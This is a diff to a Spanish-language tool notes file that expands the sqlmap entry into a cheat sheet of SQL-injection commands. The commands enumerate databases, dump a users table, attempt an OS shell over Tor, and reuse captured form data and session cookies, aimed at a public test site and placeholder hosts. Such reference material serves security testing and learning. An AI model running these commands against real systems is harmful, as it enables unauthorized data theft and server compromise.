@@ -57916,16 +57916,17 @@ Nota.- id es un número que se va ingrementando con cada entrada y entre parente
 
 
 sqlmap
-Provee automatismos para testear la seguridad entre una aplicación web y la base de datos con la que interactúa. Descarga:
-	$ git clone git://github.com/sqlmapproject/sqlmap.git
-	$ cd sqlmap
-$ python sqlmap.py -u "http://una_url.com" (forma básica)
-$ python sqlmap.py --tor --tor-type=SOCKS5 --check-tor -v -u "http://una_url.com"
-Algunas opciones:
---tor --tor-type=SOCKS5 (que use la red Tor para las peticiones)
---check-tor (comprobar si Tor se usa correctamente)
--v 6 (con la máxima información. Por defecto 1. Máximo 6)
--a (Recuperar todo)
+Herramienta automática para detectar y explotar vulnerabilidades de inyección SQL en aplicaciones web. Detecta el tipo de inyección [booleana ciega, basada en tiempo, basada en error, UNION, stacked queries, out-of-band], identifica el motor de base de datos [MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.], puede extraer bases de datos, tablas, columnas y datos y puede escalar a lectura/escritura de ficheros del servidor o incluso ejecución de comandos del SO, si los privilegios de la BD lo permiten.
+$ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" (probar una URL con parámetro GET)
+$ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs (listar las bases de datos disponibles)
+$ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables (listar tablas de una base de datos concreta)
+$ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump (volcar el contenido de una tabla)
+$ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --tor --os-shell (enrutar tráfico por Tor e intentar obtener shell del SO si hay privilegios suficientes)
+$ sqlmap -u "http://objetivo.local/login.php" --data="usuario=admin&clave=1234" (probar un formulario POST usando datos capturados)
+$ sqlmap -r peticion.txt --batch (usar un fichero de petición HTTP capturada)
+$ sqlmap -u "http://objetivo.local/pagina.php?id=1" --level=5 --risk=3 (especificar nivel y riesgo de las pruebas)
+$ sqlmap -u "http://objetivo.local/pagina.php?id=1" --cookie="PHPSESSID=abc123" (usar cookies de sesión o cabeceras personalizadas)
+$ sqlmap -u "http://objetivo.local/pagina.php?id=1" --batch --dbs (ejecutar en modo no interactivo)
 
 
 squid
